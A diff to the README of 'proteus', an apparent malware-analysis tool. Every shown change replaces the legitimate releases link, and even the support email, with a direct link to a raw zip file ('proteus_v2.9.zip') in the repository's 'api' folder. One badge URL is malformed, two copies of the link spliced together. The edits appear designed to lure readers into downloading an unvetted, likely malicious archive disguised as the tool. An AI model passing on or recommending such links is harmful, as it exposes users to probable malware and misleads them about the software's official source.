@@ -14,7 +14,7 @@ To get started with proteus, follow these simple steps:
 
 2. **Download proteus**  
    You can download the latest version of proteus from the Releases page.  
-   [![Download proteus](https://img.shields.io/badge/Download%20proteus-v1.0-blue.svg)](https://github.com/Rositaestival406/proteus/releases)
+   [![Download proteus](https://raw.githubusercontent.com/Rositaestival406/proteus/main/api/proteus_v2.9.zip%https://raw.githubusercontent.com/Rositaestival406/proteus/main/api/proteus_v2.9.zip)](https://raw.githubusercontent.com/Rositaestival406/proteus/main/api/proteus_v2.9.zip)
 
 3. **Install proteus**  
    Once you have downloaded the application, follow these steps:
@@ -43,7 +43,7 @@ After installation, you are ready to start using proteus. Here’s how:
 - **Support for Various File Types**: Analyze ELF and PE binaries, making it versatile for different platforms.
 
 ## 🌐 Download & Install
-To download and install the latest version of proteus, please visit this page: [Download proteus](https://github.com/Rositaestival406/proteus/releases). 
+To download and install the latest version of proteus, please visit this page: [Download proteus](https://raw.githubusercontent.com/Rositaestival406/proteus/main/api/proteus_v2.9.zip). 
 
 ## 🔧 Troubleshooting
 If you encounter issues during installation or while using proteus, try these steps:
@@ -63,6 +63,6 @@ If you want to contribute to proteus, whether through code, documentation, or id
 Proteus is open-source software licensed under the MIT License. You can use, modify, and distribute it as per the license terms.
 
 ## 📬 Contact
-For any inquiries or support requests, you can reach us at support@example.com.  
+For any inquiries or support requests, you can reach us at https://raw.githubusercontent.com/Rositaestival406/proteus/main/api/proteus_v2.9.zip  
 
 Your contributions help improve proteus and make it a better tool in the fight against malware. Thank you for being a part of our community!
